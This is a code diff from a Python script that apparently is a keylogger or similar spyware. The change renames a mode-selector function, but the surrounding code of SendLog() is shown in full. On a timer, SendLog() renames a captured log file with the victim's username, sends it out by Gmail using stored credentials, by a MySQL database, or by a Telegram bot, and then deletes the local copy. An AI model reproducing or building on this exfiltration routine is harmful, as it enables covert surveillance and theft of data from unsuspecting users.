@@ -394,7 +394,7 @@ def SendLog():
         time.sleep(timeSend()*60) # Tiempo de espera por minutos 
         #time.sleep(4) # Solo antigueeo 
         if VerificarConexion():
-            if (GMailOrDataBase() == 0):    # Send mail
+            if (SendMode() == 0):    # Send Gmail
                 # Crea nombre del archivo
                 nameFile = str(getuser())+"-"+random_char(8)+".txt"
                 #Renombra el archivo original
@@ -412,10 +412,10 @@ def SendLog():
                 elif SendGmail(homedir, emailS(), passS() , ReceiveE()):  # Envía con el segundo correo 
                     os.remove(homedir)
 
-            if (GMailOrDataBase() == 1):    # Send Data Base
+            if (SendMode() == 1):    # Send Data Base
                 SendDataBaseMySQL()
 
-            if (GMailOrDataBase() == 2):    # Send Telegram
+            if (SendMode() == 2):    # Send Telegram
                 TelegramBot()
         else:
             print("[Send] sin conexión")
@@ -475,7 +475,7 @@ def DB_PORT():
     return "3306"                                                   # Opcional en algunos casos
 
 # ************ End Zone DATABASE ************* 
-def GMailOrDataBase():
+def SendMode():
     return 2    # 0 = Gmail
                 # 1 = DataBase              # Solo se puede usar una opción
                 # 2 = TelegramBot
